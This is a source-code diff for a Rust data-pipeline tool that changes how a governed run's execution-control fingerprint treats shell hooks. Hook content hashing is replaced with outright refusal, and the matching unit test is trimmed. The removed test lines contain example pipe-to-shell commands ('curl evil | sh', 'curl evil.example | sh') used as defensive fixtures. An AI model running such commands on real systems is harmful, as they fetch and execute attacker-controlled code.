@@ -1400,104 +1400,27 @@ pub(crate) fn governance_policy_identity(cfg: &rocky_core::config::RockyConfig) 
     .unwrap_or_default()
 }
 
-/// The env-resolved **execution-control** identity (#1095): the on-disk `[run]`,
-/// `[reuse]`, `[resilience]`, and `[hook]`/`[hook.webhooks]` config that governs
-/// WHAT executes and WHICH side-effecting commands fire — none of which the
-/// compiled-IR projection or the routing/governance identities capture. Folded
-/// into the execution fingerprint (hashed, never compared raw — so a
-/// `[hook].env` value is never exposed) so a post-plan edit to a skip/reuse/retry
-/// toggle or a governed hook refuses at the execution choke-point.
+/// The env-resolved **execution-control** identity (#1095(a)): the on-disk
+/// `[run]`, `[reuse]`, and `[resilience]` config that governs WHAT executes and
+/// how it retries/reuses — none of which the compiled-IR projection or the
+/// routing/governance identities capture. Folded into the execution fingerprint
+/// (hashed, never compared raw), so a post-plan edit to a skip/reuse/retry toggle
+/// refuses at the execution choke-point.
 ///
-/// Shell hooks are **content-addressed**: binding only the command STRING would
-/// miss an edit to `scripts/notify.sh`'s bytes, so the first whitespace token of
-/// each command that resolves to a file under `config_dir` (or an absolute path)
-/// is blake3-hashed (an unreadable file yields a stable sentinel — fail-closed),
-/// mirroring the contract-content idiom in [`ExecutionExtras`]. Computed
-/// identically at plan time and at the apply choke-point over the SAME
-/// `config_dir`, so an unchanged project is byte-stable and never false-refuses.
-pub(crate) fn execution_control_identity(
-    cfg: &rocky_core::config::RockyConfig,
-    config_dir: &Path,
-) -> String {
-    // Sorted by event key (BTreeMap); list order preserves the parsed `[[hook]]`
-    // sequence. Each hook binds its command, delivery config, AND a content hash
-    // of any referenced local script.
-    let hooks: BTreeMap<String, serde_json::Value> = cfg
-        .hooks
-        .hooks
-        .iter()
-        .map(|(event, hook_or_list)| {
-            let entries: Vec<serde_json::Value> = hook_config_list(hook_or_list)
-                .into_iter()
-                .map(|h| {
-                    serde_json::json!({
-                        "command": h.command,
-                        "timeout_ms": h.timeout_ms,
-                        "on_failure": serde_json::to_value(&h.on_failure)
-                            .unwrap_or(serde_json::Value::Null),
-                        "env": serde_json::to_value(&h.env).unwrap_or(serde_json::Value::Null),
-                        "script": hook_script_content_hash(&h.command, config_dir),
-                    })
-                })
-                .collect();
-            (event.clone(), serde_json::Value::Array(entries))
-        })
-        .collect();
-    let webhooks: BTreeMap<String, serde_json::Value> = cfg
-        .hooks
-        .webhooks
-        .iter()
-        .map(|(event, wh)| {
-            (
-                event.clone(),
-                serde_json::to_value(wh).unwrap_or(serde_json::Value::Null),
-            )
-        })
-        .collect();
+/// `[hook]`/`[hook.webhooks]` are deliberately NOT bound here (#1095(c)). Hooks
+/// fire at pipeline-start — BEFORE the fingerprint choke-point — and a
+/// replication-only apply never reaches the gate, so binding them could not
+/// prevent a post-review hook from executing. A governed apply that configures
+/// any hook or webhook is instead REFUSED outright before any hook fires; see
+/// [`refuse_governed_side_effects`](crate::commands::run::refuse_governed_side_effects).
+pub(crate) fn execution_control_identity(cfg: &rocky_core::config::RockyConfig) -> String {
     serde_json::to_value(serde_json::json!({
         "run": serde_json::to_value(&cfg.run).unwrap_or(serde_json::Value::Null),
         "reuse": serde_json::to_value(&cfg.reuse).unwrap_or(serde_json::Value::Null),
         "resilience": serde_json::to_value(&cfg.resilience).unwrap_or(serde_json::Value::Null),
-        "hooks": hooks,
-        "webhooks": webhooks,
     }))
     .map(|v| v.to_string())
     .unwrap_or_default()
-}
-
-/// Flatten a `[hook]` event entry (single or `[[hook]]` list) to its configs.
-fn hook_config_list(
-    hook_or_list: &rocky_core::hooks::HookConfigOrList,
-) -> Vec<&rocky_core::hooks::HookConfig> {
-    match hook_or_list {
-        rocky_core::hooks::HookConfigOrList::Single(c) => vec![c],
-        rocky_core::hooks::HookConfigOrList::Multiple(v) => v.iter().collect(),
-    }
-}
-
-/// Content-address a shell hook: hash the bytes of the first command token that
-/// resolves to an existing file (relative to `config_dir` or absolute). Returns
-/// `{path, blake3}` for a resolvable script (an unreadable file → a stable
-/// sentinel, fail-closed) or `null` when the command references no local file
-/// (its command string is still bound by [`execution_control_identity`]). So an
-/// edit to a referenced script's CONTENTS — not just its command string — moves
-/// the identity and refuses a governed apply.
-fn hook_script_content_hash(command: &str, config_dir: &Path) -> serde_json::Value {
-    for token in command.split_whitespace() {
-        let candidate = if Path::new(token).is_absolute() {
-            std::path::PathBuf::from(token)
-        } else {
-            config_dir.join(token)
-        };
-        if candidate.is_file() {
-            let blake3 = match std::fs::read(&candidate) {
-                Ok(bytes) => blake3::hash(&bytes).to_hex().to_string(),
-                Err(_) => "<unreadable-hook-script>".to_string(),
-            };
-            return serde_json::json!({ "path": token, "blake3": blake3 });
-        }
-    }
-    serde_json::Value::Null
 }
 
 /// The TOCTOU check threaded to the single execution choke-point
@@ -1653,10 +1576,7 @@ impl GovernedRunContext<'_> {
             expected: self.expected_ir_fingerprint.clone(),
             config_identity: config_policy_identity(cfg),
             governance_identity: governance_policy_identity(cfg),
-            exec_control_identity: execution_control_identity(
-                cfg,
-                self.config_path.parent().unwrap_or_else(|| Path::new(".")),
-            ),
+            exec_control_identity: execution_control_identity(cfg),
             resolved_mask: cfg.resolve_mask_for_env(env),
             reviewed_source_schemas: self.reviewed_source_schemas.clone(),
             plan_id: self.plan_id.to_string(),
@@ -4344,32 +4264,29 @@ auto_create_schemas = true
         );
     }
 
-    /// #1095 closure: [`execution_control_identity`] binds `[run]`/`[reuse]`/
-    /// `[resilience]` AND content-addresses `[hook]` scripts, so a post-plan edit
-    /// to any of them moves the identity (→ the governed apply refuses at the
-    /// choke-point), while an UNCHANGED project is byte-stable (no false-refuse).
+    /// #1095(a) closure: [`execution_control_identity`] binds `[run]`/`[reuse]`/
+    /// `[resilience]`, so a post-plan edit to any of them moves the identity (→ the
+    /// governed apply refuses at the choke-point), while an UNCHANGED project is
+    /// byte-stable (no false-refuse). Hooks are enforced by REFUSAL (#1095(c)) —
+    /// see `run::refuse_governed_side_effects` — not bound here.
     #[test]
-    fn execution_control_identity_binds_config_and_content_addresses_hooks() {
+    fn execution_control_identity_binds_run_reuse_resilience() {
         let dir = tempfile::tempdir().unwrap();
-        let script = dir.path().join("notify.sh");
-        std::fs::write(&script, b"#!/bin/sh\necho reviewed\n").unwrap();
-        let root = dir.path();
         let load = |body: &str| -> rocky_core::config::RockyConfig {
-            let p = root.join("rocky.toml");
+            let p = dir.path().join("rocky.toml");
             std::fs::write(&p, body).unwrap();
             rocky_core::config::load_rocky_config(&p).unwrap()
         };
         let base_toml = "[adapter]\ntype = \"duckdb\"\npath = \"x.duckdb\"\n\n\
             [pipeline.p]\ntype = \"transformation\"\nmodels = \"models/**\"\n\n\
             [pipeline.p.target]\nadapter = \"default\"\n\n\
-            [run]\nskip_unchanged = false\n\n\
-            [hook.on_pipeline_start]\ncommand = \"notify.sh\"\n";
-        let base = super::execution_control_identity(&load(base_toml), root);
+            [run]\nskip_unchanged = false\n";
+        let base = super::execution_control_identity(&load(base_toml));
 
-        // Unchanged config + unchanged script → byte-stable (no false-refuse).
+        // Unchanged config → byte-stable (no false-refuse).
         assert_eq!(
             base,
-            super::execution_control_identity(&load(base_toml), root),
+            super::execution_control_identity(&load(base_toml)),
             "an unchanged project must produce a stable execution-control identity"
         );
 
@@ -4378,7 +4295,7 @@ auto_create_schemas = true
         let skip = base_toml.replace("skip_unchanged = false", "skip_unchanged = true");
         assert_ne!(
             base,
-            super::execution_control_identity(&load(&skip), root),
+            super::execution_control_identity(&load(&skip)),
             "a [run].skip_unchanged flip must move the identity"
         );
 
@@ -4386,7 +4303,7 @@ auto_create_schemas = true
         let reuse = format!("{base_toml}\n[reuse]\nenabled = true\n");
         assert_ne!(
             base,
-            super::execution_control_identity(&load(&reuse), root),
+            super::execution_control_identity(&load(&reuse)),
             "a [reuse] toggle must move the identity"
         );
 
@@ -4394,26 +4311,8 @@ auto_create_schemas = true
         let resil = format!("{base_toml}\n[resilience]\ntransient_max_retries = 9\n");
         assert_ne!(
             base,
-            super::execution_control_identity(&load(&resil), root),
+            super::execution_control_identity(&load(&resil)),
             "a [resilience] change must move the identity"
-        );
-
-        // (d) hook COMMAND edit → moves (the classic post-review arbitrary command).
-        let cmd = base_toml.replace("command = \"notify.sh\"", "command = \"curl evil | sh\"");
-        assert_ne!(
-            base,
-            super::execution_control_identity(&load(&cmd), root),
-            "a [hook] command edit must move the identity"
-        );
-
-        // (e) referenced SCRIPT CONTENTS edit, command string UNCHANGED → moves.
-        // Binding only the command string would miss this — content-addressing
-        // (blake3 of the script bytes) catches it. This is the #1095(c) core.
-        std::fs::write(&script, b"#!/bin/sh\ncurl evil.example | sh\n").unwrap();
-        assert_ne!(
-            base,
-            super::execution_control_identity(&load(base_toml), root),
-            "editing a hook's referenced script CONTENTS must move the identity"
         );
     }
 
